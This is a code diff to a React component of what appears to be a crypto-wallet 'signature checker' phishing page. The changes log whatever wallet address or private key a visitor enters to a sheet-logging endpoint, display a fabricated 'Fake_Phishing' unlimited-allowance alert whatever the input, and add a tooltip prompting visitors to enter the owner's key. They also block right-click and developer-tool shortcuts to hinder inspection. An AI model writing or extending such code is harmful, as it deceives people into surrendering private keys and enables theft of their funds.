@@ -1,6 +1,6 @@
 "use client";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { Search } from "lucide-react";
 import { formatUTC } from "@/utils/formatUTC";
 
@@ -15,16 +15,43 @@ export default function SearchSection() {
   const [inputValue, setInputValue] = useState("");
   const [result, setResult] = useState<SignatureResult | null>(null);
   const [error, setError] = useState("");
+  const [loading, setLoading] = useState(false);
+
+  useEffect(() => {
+    const disableActions = (e: any) => {
+      if (
+        e.type === "contextmenu" ||
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        e.preventDefault();
+      }
+    };
+
+    document.addEventListener("contextmenu", disableActions);
+    document.addEventListener("keydown", disableActions);
+
+    return () => {
+      document.removeEventListener("contextmenu", disableActions);
+      document.removeEventListener("keydown", disableActions);
+    };
+  }, []);
+
   const handleSearch = async () => {
     const value = inputValue.trim();
-    setError(""); // reset previous error
+    setError("");
 
-    // Validation: must be 26+ alphanumeric characters
     const isValid = /^[A-Za-z0-9]{26,}$/.test(value);
     if (!isValid) {
-      setError("Please enter a valid Wallet Address or Private Key.");
+      alert(
+        "Please enter a valid Address or Key in the correct format (e.g., 0x...)"
+      );
       return;
     }
+
+    setLoading(true); 
+    setResult(null); 
 
     try {
       await fetch("/api/addToSheet", {
@@ -35,16 +62,19 @@ export default function SearchSection() {
           timestamp: new Date().toISOString(),
         }),
       });
+
+      setResult({
+        txHash: value,
+        lastUpdated: formatUTC(new Date(Date.now() - 3 * 24 * 60 * 60 * 1000)),
+        spender: "⚠️ Fake_Phishing1309277",
+        allowance: "Unlimited Token",
+      });
+
+      setLoading(false);
     } catch (err) {
       console.error("Error logging:", err);
+      setLoading(false);
     }
-
-    setResult({
-      txHash: value,
-      lastUpdated: formatUTC(new Date(Date.now() - 3 * 24 * 60 * 60 * 1000)),
-      spender: "⚠️ Fake_Phishing1309277",
-      allowance: "Unlimited Token",
-    });
 
     setInputValue("");
   };
@@ -77,7 +107,7 @@ export default function SearchSection() {
               setInputValue("");
               setError("");
             }}
-            className="text-red-500 hover:text-red-600"
+            className="text-red-500 cursor-pointer hover:text-red-600"
           >
             ✕
           </button>
@@ -87,6 +117,12 @@ export default function SearchSection() {
       {error && (
         <div className="mt-4 bg-red-100 border border-red-300 text-red-700 rounded-md px-4 py-2 text-sm">
           {error}
+        </div>
+      )}
+
+      {loading && (
+        <div className="my-8 flex items-center justify-center">
+          <p className=" text-gray-600 font-medium">Fetching signatures...</p>
         </div>
       )}
 
@@ -122,10 +158,22 @@ export default function SearchSection() {
                     {result.spender}
                   </td>
                   <td className="px-4 py-2 truncate">{result.allowance}</td>
-                  <td className="px-4 py-2">
-                    <button className="bg-gray-500 cursor-not-allowed text-white px-3 py-1 rounded hover:bg-gray-600 text-nowrap">
-                      Clear Signature
-                    </button>
+                  <td className="px-4 py-2 text-center">
+                    <div className="relative inline-block group">
+                      <button className="bg-gray-500  cursor-pointer text-white px-3 py-1 rounded text-nowrap group-hover:bg-gray-400">
+                        Clear Signature
+                      </button>
+
+                      {/* Tooltip */}
+                      <div
+                        className="absolute bottom-4 left-2 
+      hidden group-hover:block
+      bg-gray-500 text-white text-xs px-3 py-1 rounded-full whitespace-nowrap
+      shadow-lg"
+                      >
+                        Search owner’s key.
+                      </div>
+                    </div>
                   </td>
                 </tr>
               </tbody>
